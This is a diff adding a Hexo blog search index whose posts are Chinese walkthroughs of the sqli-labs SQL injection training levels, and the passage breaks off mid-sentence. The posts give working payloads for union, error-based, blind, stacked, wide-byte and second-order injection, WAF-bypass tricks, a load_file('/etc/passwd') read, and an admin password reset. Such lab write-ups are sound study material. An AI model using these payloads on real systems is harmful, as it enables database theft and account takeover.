@@ -1,0 +1,642 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Hello World</title>
+    <url>/2024/08/04/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>less18-22</title>
+    <url>/2024/11/24/less18-22/</url>
+    <content><![CDATA[<h1 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h1><p>如果输入正确的账号密码，则页面回显你的ip与user-agent</p>
+<p><img src="/../images/1732457032265.png" alt="1732457032265" loading="lazy"></p>
+<p>如果错误登录则只会回显ip，显然不能进行之前的注入。</p>
+<p>我们查看源码（这里是一部分）</p>
+<p><img src="/../images/1732419575415.jpg" alt="1732419575415" loading="lazy"></p>
+<p>发现密码和账户都被17关的过滤给保护起来了。因此显然难以通过账户密码进行注入，但我们可以发现在查询成功处有给insert操作将uagent，与ip和uname插入括号里的三个字段中，我们便能想到通过修改uagent的值进行注入。</p>
+<p>要修改这个值我们需使用burp suite来进行抓包。</p>
+<p>并且修改user-agent的值。</p>
+<p><img src="/../images/1733489271913.jpg" alt="1733489271913" loading="lazy"></p>
+<p>这里的payload是<code>1&#39;,&#39;2&#39;,(select 1 from (select concat((floor(rand(0)*2 )),database()) as a,count(*) from information_schema.tables group by a)as t))#</code></p>
+<p>我们也可以用extractvalue,updatexml等函数的报错注入来简化payload。</p>
+<h1 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h1><p>看关卡标题我们就可以知道这关和上关类似，不过这次我们需要修改的是Referer请求头，Referer指的是发起请求的上一页面也就是要从哪跳转到下一页面。</p>
+<p>我们构造的payload和上一关类似</p>
+<p><code>1&#39;,extractvalue(1,concat(0x7e,(select database()))))#</code></p>
+<p>因为源码中insert语句的变量少了。</p>
+<p><img src="/../images/1735725090372.jpg" alt="1735725090372" loading="lazy"></p>
+<p>注入成功。</p>
+<h1 id="less20-cookie"><a href="#less20-cookie" class="headerlink" title="less20(cookie)"></a>less20(cookie)</h1><p>首先尝试直接在username和password注入，无果，我们可以首先使用合法的账户登录，再由标题可知我们可以从cookie下手，既然页面能显示我的cookie，那么他一定在后台获取了我的cookie，又显示了我的账户密码，我们便可以猜测是通过检验cookie中的uname的值来显示不同的账号密码，我们查看源码。</p>
+<p><img src="/../images/1736838783987.jpg" alt="1736838783987" loading="lazy"></p>
+<p>我们便能知道注入点就是那个SQL语句。我们只要修改cookie的值便能进行注入。例如</p>
+<p><img src="/../images/1736839137733.jpg" alt="1736839137733" loading="lazy"></p>
+<p>我们便可以得到想要的值。</p>
+<h1 id="less21-cookie"><a href="#less21-cookie" class="headerlink" title="less21(cookie)"></a>less21(cookie)</h1><p>同上，不过是括号加单引号闭合，且是base64编码。</p>
+<h1 id="less22-cookie"><a href="#less22-cookie" class="headerlink" title="less22(cookie)"></a>less22(cookie)</h1><p>同20，但是双引号</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>less38-41</title>
+    <url>/2025/02/18/less38-41/</url>
+    <content><![CDATA[<p><strong>Less 38 ~ 41 虽然使用 Less 1 的方式注入即可注入成功，但是这 4 关存在堆叠注入漏洞。我们可以使用 “;” 闭合第一个 SQL 语句，然后在后面执行任意的 SQL 语句，通过这个漏洞我们可以对数据库执行任意的操作。</strong></p>
+<h1 id="less38"><a href="#less38" class="headerlink" title="less38"></a>less38</h1><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>此处使用 Less 1 的 payload 就可以完成注入，此处用于测试堆叠注入。所谓<strong>堆叠注入</strong>就是在原语句后加上分号，从而闭合前面的内容作为第一条 SQL 语句。然后在后面输入第二条的数据库操作语句，在条件允许可以被后端带入数据库执行。堆叠注入使用的范围非常有限，例如后端可能会限制 SQL 只执行一条语句。一旦这种漏洞存在，对数据库的破坏性是毁灭性的，因为这表示攻击者可以肆意对数据库进行操作。</p>
+<p>堆叠注入攻击<br>堆叠查询注入攻击可以执行多条语句，多语句之间以分号隔开。堆叠查询注入就是利用这个特点，在第二个SQL语句中构造自己的要执行的语句<br>新建一个表<code>select * from users;create table A like users;</code><br>删除创建的A表<code>select * from users;drop table test;</code><br>查询数据<code>select * from users;select B,C,D;</code><br>加载文件<code>select * from users;select load_file(&#39;/etc/passwd&#39;);</code><br>增加一条数据<code>select * from users;insert into users values(18,&#39;zhong&#39;,&#39;zhong&#39;);</code></p>
+<p>查看源码发现源码使用了 <strong>mysqli_multi_query()</strong> 函数，该函数可以执行多个 MySQL 语句。之前的 Less 使用的是 <strong>mysql_query() 函数</strong>，该函数只执行一条 MySQL 查询。</p>
+<h1 id="less39"><a href="#less39" class="headerlink" title="less39"></a>less39</h1><p>和less38一样，不过是数值型注入。</p>
+<h1 id="less40"><a href="#less40" class="headerlink" title="less40"></a>less40</h1><p>也是堆叠注入不过是单引号和括号型。</p>
+<h1 id="less41"><a href="#less41" class="headerlink" title="less41"></a>less41</h1><p>和39差不多也是堆叠注入的数值型。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>less28-less37</title>
+    <url>/2025/02/18/less28-less37/</url>
+    <content><![CDATA[<h1 id="less28"><a href="#less28" class="headerlink" title="less28"></a>less28</h1><p>本关除了过滤注释符和空格，还将连续的<strong>union select</strong>给过滤了，我们可以使用双写绕过。</p>
+<h2 id="a0的问题"><a href="#a0的问题" class="headerlink" title="%a0的问题"></a>%a0的问题</h2><p>在别人的博客中我们发现有人使用%a0来代替空格是不会被过滤的，查询资料发现，是因为php版本不同在php5.2.17中，%a0是可以被解析成空格的，而php7中却不行。</p>
+<h1 id="less29-31"><a href="#less29-31" class="headerlink" title="less29-31"></a>less29-31</h1><p>这三关除了字符注入类型不同，其他方面几乎是一致的。</p>
+<p>源代码中出现了<code>$qs = $_SERVER[&#39;QUERY_STRING&#39;];</code></p>
+<p>当这行代码执行时，它会从当前请求的 URL 中提取查询字符串，并将其存储在 <code>$qs</code> 变量中。这样你就可以在PHP脚本中使用这个查询字符串来获取请求参数，进行条件判断，或者执行其他逻辑。例如，在 URL <code>http://example.com/page.php?name=John&amp;age=30</code> 中，查询字符串是 <code>name=John&amp;age=30</code>。</p>
+<p>当输入正常参数时，网页返回正常信息，当输入单引号时，网页会被切换到hacked.php，应该是注入参数被WAF防御了。查看源码</p>
+<p>login.php：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function whitelist($input)</span><br><span class="line">&#123;</span><br><span class="line">	$match = preg_match(&quot;/^\d+$/&quot;, $input);</span><br><span class="line">	if($match)</span><br><span class="line">	&#123;</span><br><span class="line">		//echo &quot;you are good&quot;;</span><br><span class="line">		//return $match;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;	</span><br><span class="line">		header(&#x27;Location: hacked.php&#x27;);</span><br><span class="line">		//echo &quot;you are bad&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">function java_implimentation($query_string)</span><br><span class="line">&#123;</span><br><span class="line">	$q_s = $query_string;</span><br><span class="line">	$qs_array= explode(&quot;&amp;&quot;,$q_s);</span><br><span class="line"></span><br><span class="line">	foreach($qs_array as $key =&gt; $value)</span><br><span class="line">	&#123;</span><br><span class="line">		$val=substr($value,0,2);</span><br><span class="line">		if($val==&quot;id&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">			$id_value=substr($value,3,30); </span><br><span class="line">			return $id_value;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>whitelist（）：</p>
+<p>是用于检查输入是否为纯数字，如果不是则跳转到 hacked.php</p>
+<p>java_implimentation（）：</p>
+<p>explode()把字符串打散为数组，例如$str&#x3D;”Hello World”在explode(“ “;$str)函数作用下就被打散成了Array([0] &#x3D;&gt; Hello ，[1] &#x3D;&gt; World)</p>
+<p>而foreach()函数主要作用就是遍历数组，将数组被分割的数组一一输出出来。这个函数有两种语法：</p>
+<ul>
+<li>foreach (array_expression as $value):每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步</li>
+<li>foreach (array_expression as $key &#x3D;&gt; $value)：同语句一，同时当前单元的键名在每次循环中赋值给$key。</li>
+</ul>
+<p>这两个自定义函数的效果就是将语句以“&amp;”为标识分割开，然后再分割开的数组的前两位找id值，如果找到了就截取这个数组的第4位到30位的长度交给preg_match()进行正则匹配。</p>
+<p>对此我们可以使用 <strong>HTTP 参数污染攻击</strong></p>
+<p>原理为：</p>
+<p>截图等来自《MySQL注入天书：Less 29》</p>
+<p><img src="/../images/bc43cb9cc3e035dee1f34323fb0ae1c2.png" alt="bc43cb9cc3e035dee1f34323fb0ae1c2" loading="lazy"></p>
+<p>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache 为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。</p>
+<p>工作流程为：client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p>
+<p>接下来是参数解析的问题。<br>问：index.php?id&#x3D;1&amp;id&#x3D;2，这时回显是id&#x3D;1还是id&#x3D;2呢？<br>答：apache (php) 解析最后一个参数，即回显id&#x3D;2；tomcat (jsp) 解析第<br>一个参数，即回显id&#x3D;1。</p>
+<p>大多数服务器对于参数解析：</p>
+<p><img src="/../images/09d8f68230d3ee833917982a92d043dd.png" alt="09d8f68230d3ee833917982a92d043dd" loading="lazy"></p>
+<p>这里有一个新问题。<br>问：index.jsp?id&#x3D;1&amp;id&#x3D;2，针对这关的两层结构，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 请求 apache，apache 解析最后一个参数。那么最终返回客户端的是哪个参数？<br>答：此处应该还是id&#x3D;2，因为实际上提供服务的是 apache 服务器，返回的数据也应该是 apache 处理的数据。</p>
+<p>而在我们实际应用中，也是有两层服务器的情况，那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一个 WAF。</p>
+<p>而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。如 payload：index.jsp?id&#x3D;1&amp;id&#x3D;0 or 1&#x3D;1–+，tomcat 只检查第一个参数id&#x3D;1，而对第二个参数id&#x3D;0 or 1&#x3D;1–+不做检查，直接传给了 apache，apache 恰好解析第二个参数，便达到了攻击的目的。</p>
+<p>该用法就是 HPP（HTTP Parameter Pollution）即 HTTP 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。</p>
+<p>less-30双引号注入，less-31双引号加括号注入，语句构建思路与29关完全一致。</p>
+<h1 id="less32-33-35-36"><a href="#less32-33-35-36" class="headerlink" title="less32-33&amp;35&amp;36"></a>less32-33&amp;35&amp;36</h1><p>Less 32、33、35、36 都涉及到了对注入参数的转义，在一般情况下是不能注入的。但是当数据库使用 GBK 国标码或者其他编码时，可以使用恶意的参数把用于转义的斜杠“吃掉”变成其他字符，这就是所谓宽字节注入。使用宽字节注入绕过转义之后，其他的注入步骤和 Less 1 相似。</p>
+<p>查看源码发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote with a backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span><br><span class="line"></span><br><span class="line">    return $string;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>preg_quote(&#39;\\&#39;)</code>**：<code>preg_quote</code> 函数用于转义正则表达式中的特殊字符。由于反斜杠（<code>\</code>）在正则表达式中是特殊字符，所以需要先对其进行转义。这里传入的 <code>\\</code> 实际上表示一个反斜杠字符，因为在 PHP 字符串中，反斜杠本身是转义字符，所以需要用两个反斜杠来表示一个实际的反斜杠。<code>preg_quote(&#39;\\&#39;)</code> 的结果是 <code>\\</code>，表示匹配一个实际的反斜杠字符。</li>
+<li><strong><code>preg_replace</code><strong>：该函数用于执行正则表达式的搜索和替换操作。第一个参数是正则表达式模式，这里是 <code>/\\/</code>，表示匹配字符串中的反斜杠字符。第二个参数是替换字符串，<code>\\\\\\</code> 在 PHP 字符串中表示两个连续的反斜杠（<code>\\</code>），因为每个反斜杠都需要用两个反斜杠来转义。</strong>所以这行代码的作用是将字符串中的每个反斜杠替换为两个反斜杠，还在‘前加上反斜杠以转义，实现反斜杠的转义。</strong></li>
+</ul>
+<p>接着是这句代码：<br><code>mysql_query(&quot;SET NAMES gbk&quot;);</code><br>这行代码的作用是设置客户端（即PHP脚本）与MySQL数据库服务器之间编码使用GBK国标码。</p>
+<p>当数据库的编码采用 <strong>GBK 国标码</strong>时，虽然单引号还是会加上反斜杠从而被转义，但是 “%df” 会和反斜杠的 URL 编码 “%5C” 闭合，从而构成 GBK 国标码中的汉字“連”，使得用于转义的反斜杠被我们“吃掉”了。</p>
+<p>接下来就用联合查询注入</p>
+<p>less33和32差不多，less-33与32关的区别在于这关使用了addslashes()函数进行过滤操作，此处的过滤函数是 <strong>addslashes() 函数</strong>，用于在预定义字符之前添加反斜杠，预定字符有单引号、双引号和反斜杠。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Copy Highlighter-hljsfunction <span class="title function_ invoke__">check_addslashes</span>(<span class="variable">$string</span>)</span><br><span class="line">&#123;</span><br><span class="line">      <span class="variable">$string</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);    </span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>less35是数值型转义就没用了。</p>
+<p>而less-36则是使用了mysql_real_escape_string()进行过滤，本质上都没什么差别。</p>
+<h1 id="less34-37"><a href="#less34-37" class="headerlink" title="less34&amp;37"></a>less34&amp;37</h1><p>less34是用 **addslashes() **过滤的</p>
+<p>less37是用**mysql_real_escape_string()**函数进行过滤</p>
+<p>这两个和之前的差不多不过是post传参。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>less42-45</title>
+    <url>/2025/02/19/less42-45/</url>
+    <content><![CDATA[<p><strong>Less 42 ~ 45 是使用 POST 提交参数的登录界面，username 字段进行了参数过滤，但是 password 字段没有。此处可以在 password 字段使用万能密码直接夺取用户，也可以在该字段处使用堆叠注入。</strong></p>
+<h1 id="less42"><a href="#less42" class="headerlink" title="less42"></a>less42</h1><p>在用户名使用万能密码测试，全部都登录失败。</p>
+<p>在密码字段使用万能密码测试，使用单引号闭合时登录成功。说明用户名参数注入时存在过滤，密码字段存在单引号闭合的字符型注入。</p>
+<p>可以在已知某个用户的用户名的条件下使用万能密码夺取用户，也可以使用二次注入进行攻击。由于密码参数没有进行防御，可以在该字段测试堆叠注入。使用 Less 38 的测试流程，每次登陆时完成一步堆叠注入。</p>
+<h1 id="less43"><a href="#less43" class="headerlink" title="less43"></a>less43</h1><p>和less42一样，不过是单引号和括号闭合。</p>
+<h1 id="less44"><a href="#less44" class="headerlink" title="less44"></a>less44</h1><p>和less42一样</p>
+<h1 id="less45"><a href="#less45" class="headerlink" title="less45"></a>less45</h1><p>和less43一样</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>less46-49</title>
+    <url>/2025/02/19/less46-49/</url>
+    <content><![CDATA[<p><strong>Less 46 ~ 49 的网页功能是返回一个列表，因此我们不能借助回显位置进行注入。此时可以根据是否返回报错信息，选择使用报错注入还是时间盲注。</strong></p>
+<h1 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h1><p>改变参数 sort 的值，发现返回的列表是根据该表的第 sort 列排序进行回显。</p>
+<p>把所有类型测试完发现是数值型注入。</p>
+<p>由于此处数据返回的形式是表格，因此我们不能直接利用数据回显的位置。此处可以使用 <strong>updatexml() 函数</strong>进行报错注入，把敏感信息输出在错误信息中</p>
+<h1 id="less47"><a href="#less47" class="headerlink" title="less47"></a>less47</h1><p>和less46差不多，不过是单引号闭合</p>
+<h1 id="less48"><a href="#less48" class="headerlink" title="less48"></a>less48</h1><p>数值型，但没有错误信息回显，我们可以用时间盲注。</p>
+<h1 id="less49"><a href="#less49" class="headerlink" title="less49"></a>less49</h1><p>和less48差不多，不过是单引号闭合。</p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>less23-27</title>
+    <url>/2025/01/14/less23-27/</url>
+    <content><![CDATA[<h1 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h1><p>尝试之前的get题的方法发现总是有语法错误，而且报错内容中多出一个引号，我们可以推断我们注释符号没有起作用，查看源码。</p>
+<p><img src="/../images/1736866487923.jpg" alt="1736866487923" loading="lazy"></p>
+<p>果然给干没了，既然不能注释掉多余的引号那么我们可以想到使用多个or来中和掉多出来的一个引号payload如下:</p>
+<p><code> ?id=2&#39;  or extractvalue(1,concat(0x7e,(select database()),0x7e)) or &#39;1&#39;=&#39;1</code></p>
+<p>成功。</p>
+<p><img src="/../images/1736866811069.jpg" alt="1736866811069" loading="lazy"></p>
+<h1 id="less24"><a href="#less24" class="headerlink" title="less24"></a>less24</h1><p>首先查找注入点</p>
+<p><img src="/../images/1738307969207.jpg" alt="1738307969207" loading="lazy"></p>
+<p>发现在登录和注册都有过滤，我们试着登录看看</p>
+<p><img src="/../images/1738308060203.jpg" alt="1738308060203" loading="lazy"></p>
+<p>发现能改密码，但也过滤了，无思路，我们看看源码。发现这里是用session获取的用户名且并没过滤，这就是注入点</p>
+<p><img src="/../images/1738308271201(1).jpg" alt="1738308271201(1)" loading="lazy"></p>
+<p><img src="/../images/1738308636055.jpg" alt="1738308636055" loading="lazy"></p>
+<p>这里的原理是注册一个危险字段的用户，由于通过session获取的时候没过滤，那么储存在session中的危险字段便能利用（这里注册时的转义只是暂时的）。</p>
+<p>我们讲用户名注册成例如这样</p>
+<p><code>admin&#39;#</code></p>
+<p>此时sql语句变成这样</p>
+<p><code>&quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;</code></p>
+<p>那么#后面的语句便被注释了，也就是说我们不需要知道当下的密码便可以修改admin的密码。</p>
+<h1 id="less25-less25a"><a href="#less25-less25a" class="headerlink" title="less25&amp;less25a"></a>less25&amp;less25a</h1><p>由提示可知，”AND”和”OR”被过滤了，那么我们可以使用双写绕过。</p>
+<p><strong>双写绕过：</strong></p>
+<p>即讲“or”写成“OorR”，这样中间的“or”会被过滤掉，而“OR”则被留下，值得注意的是，如果在payload中的其他单词中也有“or”或者“and”的部分，则也要双写以防被过滤。</p>
+<p>less25a则是数字型注入，其余和less25差不多。</p>
+<h1 id="less26-less26a"><a href="#less26-less26a" class="headerlink" title="less26&amp;less26a"></a>less26&amp;less26a</h1><p>在这一关，除了or 和and被过滤，还有注释符和空格也被过滤了，那么我们可以利用其他的字符代替使用<strong>“%a0”</strong> 或<strong>“%0b”</strong> 替代空格，使用<strong>“||”</strong> 替代 “or”，使用<strong>“%26%26”</strong> 替代 “and”。</p>
+<p>26a不回显报错信息，所以我们只能让信息爆在显示位上。</p>
+<h1 id="less27-less27a"><a href="#less27-less27a" class="headerlink" title="less27&amp;less27a"></a>less27&amp;less27a</h1><p>or和and没被过滤，不过空格和注释符还有select和union被过滤了。我们可以用<strong>大小写过滤</strong>，即将大小写混杂，也可以使用报错注入来回显信息。</p>
+<p>27a报错无回显，那么就用大小写过滤。</p>
+<p>我们发现有些过滤语句后面的反斜杠上有m或s，这是什么意思呢，这是设定的修正符，修正符的具体效果参照下面这个链接：<br><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers">正则表达式中的修正符</a></p>
+]]></content>
+      <tags>
+        <tag>sqlilab注入 web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>less1-7</title>
+    <url>/2024/11/06/less1-7/</url>
+    <content><![CDATA[<h1 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h1><p><strong>首先判断是否存在sql注入漏洞：</strong></p>
+<p>利用无论字符型还是整型都会因为单引号个数不匹配而报错，输入?id&#x3D;1（? 是查询字符串的开始标志，它告诉服务器URL的这一部分包含的是查询参数。）正常返回，输入?id&#x3D;1’,报错，说明存在注入.<img src="/../images/1730902369074.jpg" alt="1730902369074" loading="lazy"></p>
+<p><strong>判断sql注入漏洞的类型：</strong></p>
+<p>通常sql注入漏洞的类型有两种:数字型和字符型。</p>
+<p><em>判断</em>：当输入的参 x 为整型时，Sql 语句大致如下：select * from &lt;表</p>
+<p>名&gt; where id &#x3D; x这种类型可以使用的and 1&#x3D;1 和 and 1&#x3D;2 可以通过加，</p>
+<p>减，乘，除等运算来判断输入参数周围有没有引号来包围来判断：Url 地</p>
+<p>址中输入x and 1&#x3D;1 页面依旧运行正常，继续进行下一步。Url 地址中继</p>
+<p>续输入x and 1&#x3D;2页面运行正常，则说明输入参数有引号包围，为字符型。</p>
+<p><img src="/images/1730902565152.jpg" loading="lazy"></p>
+<p><strong>判断表的字段数：</strong></p>
+<p>使用order by 函数来判断，order by函数是用来让返回</p>
+<p>的结果集以某一列来排序，输入 id&#x3D;1’ order by 3–+（–+可以使后面的</p>
+<p>代码变成注释从而无法执行）正常，说明存在第三列，再输入id&#x3D;1’ order</p>
+<p> by 4–+报错，说明只有三个字段。<img src="/images/1730902802300.jpg" loading="lazy"></p>
+<p><strong>使用联合查询来爆显示位：</strong></p>
+<p>输入?id&#x3D;-1’ union select 1,2,3 – +（）可</p>
+<p>知显示位，这是将一个固定的结果集（在这个例子中是包含三列，每列的</p>
+<p>值分别是 1、2、3 的单行）与原始查询的结果集合并，id&#x3D;-1是为了使前</p>
+<p>面的查询为空，不然只会显示前面查询的结果。<img src="/images/1730902876253.jpg" loading="lazy"></p>
+<p><strong>查看当前数据库：</strong></p>
+<p>利用自带函数datebase()查询数据库名称。输入?id&#x3D;-2’ union select 1,2,database() –+。<img src="/images/1730903040670.jpg" loading="lazy"></p>
+<p><strong>查表名：</strong></p>
+<p>利用GROUP_CONCAT函数将一个字段的多行连接成一个字符串并显示，即?id&#x3D;-1’ union select 1,2,GROUP_CONCAT(table_name) from </p>
+<p>information_schema.<code>TABLES</code> where table_schema &#x3D;’security’;–+</p>
+<p>(information_schema是MySQL中默认建立的数据库里面包含scheata，</p>
+<p>tables，columns。有我们想要的表名)<img src="/images/1730903363614.jpg" loading="lazy"></p>
+<p><strong>查列名：</strong></p>
+<p>同样利用GROUP_CONCAT。即GROUP_CONCAT(column_name) from information_schema.columns where table_name &#x3D;’users’ and table_schema&#x3D;’security’<img src="/images/1730941402519.jpg" loading="lazy"></p>
+<p><strong>查询账户以及密码：</strong></p>
+<p>同样使用GROUP_CONCAT函数，?id&#x3D;-1’ union select1</p>
+<p>,group_concat(username),group_concat(password) from users – +即</p>
+<p>可得到账户密码。<img src="/images/1730941548996.jpg" loading="lazy"></p>
+<p>。</p>
+<h1 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h1><p>与less1类似不过是整形注入，输入id的时候后面不用加引号啥的。</p>
+<h1 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h1><p>输入id&#x3D;1’发现报错信息和之前有点不一样，多了个括号。</p>
+<p><img src="/../images/1730944460794.jpg" alt="1730944460794" loading="lazy"></p>
+<p>我们查看源码发现是单引号和括号型的。<img src="/../images/1730944568271.jpg" alt="1730944568271" loading="lazy"></p>
+<p>我们尝试加括号，可以了。<img src="/../images/1730944652494.jpg" alt="1730944652494" loading="lazy"></p>
+<p>接下来就和less1一样。</p>
+<h1 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h1><p>是双引号加括号的注入，别的步骤与less1类似</p>
+<h1 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h1><p>先判断什么类型的注入，由前面的知识易得是单引号注入。但与之前不一样的是，这里如果正确查询是不返回信息的，只有错误才返回错误信息。![3327075-20240202223242845-678741103 (1)](..&#x2F;images&#x2F;3327075-20240202223242845-678741103 (1).png)</p>
+<p><img src="/../images/3327075-20240202223254490-408531609.png" alt="3327075-20240202223254490-408531609" loading="lazy"></p>
+<p>我们便可以想到盲注</p>
+<p><strong>方法1</strong>；<strong>布尔盲注</strong></p>
+<p>基本原理是根据返回页面的正确与否来判断我们的查询代码是否能正常执行。</p>
+<p>布尔盲注主要用到<strong>length()</strong>,<strong>ascii()</strong> ,**substr()**这三个函数，</p>
+<p><strong>length（）</strong> 返回括号中字符串的长度；<strong>ASCII（）</strong> 返回的是括号中字符或字符串的第一个字符的ASCII码；<strong>substr(str,start,len)</strong> 截取“str”字符串从第“start”位开始的“len”长度的字符。</p>
+<p>首先用<strong>length（）</strong> 确定你要查询的库名或表名或字段名的长度，再用</p>
+<p><strong>ASCII（substr(库名，start，len))&#x3D;…</strong> 来判断库名的某个字符是什么。为了提高效率，我们可以使用代码批量操作，这里不作说明。</p>
+<p> <strong>方法2</strong>；<strong>双查询注入</strong></p>
+<p>关于啥是双查询注入请看 [双查询注入](<a href="https://blog.csdn.net/weixin_43901998/article/details/105227678">Less 5-6（双注入）_less-5-CSDN博客</a>)的后半部分。</p>
+<p><em>我们摘出重要的部分：</em></p>
+<p><img src="/../images/188c1b8f4eb7bf37cd72dbb26d6a446e.png" alt="188c1b8f4eb7bf37cd72dbb26d6a446e" loading="lazy"></p>
+<p><em>上面这张图就是group by通过floor分组的过程。<br>我们知道floor产生的随机序列是固定的011011,再进行group by分组的时候，我会将这个随机序列作为虚拟表的key, 进行查询和插入两步操作。我们假设要先查询后插入，这里我把没有查询到值的查询用黑色，查询到值的查询用红色。</em></p>
+<p><em>下面来描述一下查询和插入的过程：</em></p>
+<p><em>第一次查询，再虚拟表中查询key为0的字段，发现虚拟表为空，因此进行插入操作。<br>第一次插入，再进行插入操作的时候，group by会再次调用floor()，因此插入的key是1而不是0，还会将对应的count()值填在key的后面。<br>第二次查询，查询时，group by再一次调用floor，得到的值为1，查询虚拟表中是否有key为1的字段，发现存在，因此此处的插入操作就是将coun()的值进行叠加。此时第二次查询操作和插入操作都已经完毕，然后进行第三次查询。<br>第三次查询，此时查询的key为0，发现虚拟表中没有0，因此要进行插入操作。<br>第三次插入，再进行插入前，group by要调用floor()，得到了1，因此要插入一个key为1的字段。而key为1的字段已经存在了，因此主键重复，MySQL会报错。（图上多画了一个最后红色的查询3，可以忽略掉）</em></p>
+<p>了解双查询注入后，我们便可以编辑代码测试。</p>
+<p><code>?id=1&#39; and (select (floor(rand(0)*2 )) as a,count(*) from information_schema.tables group by a)--+</code></p>
+<p>但发现<img src="/../images/1731121921050.jpg" alt="1731121921050" loading="lazy"></p>
+<p>经过查询，是因为如果在一个条件语句（如 <code>WHERE</code> 或 <code>AND</code>）中使用子查询，并且子查询返回了多个列，那么会引发 <code>Operand should contain 1 column(s)</code> 错误。因为在这种情况下，MySQL 不知道如何将多个列与外部查询的某个列进行比较。我们这里就是返回了两列结果。</p>
+<p>我们改进一下，在子查询前加上select 1，这样子and后的整个查询语句只会关系子查询是否有结果而不会在意有几列。</p>
+<p><code>?id=1&#39; and (select 1 from (select concat((floor(rand(0)*2 )),database()) as a,count(*) from information_schema.tables group by a)as t)--+</code></p>
+<p>我们便可以用concat来连接我们想要查询的数据。所以最终的公式为</p>
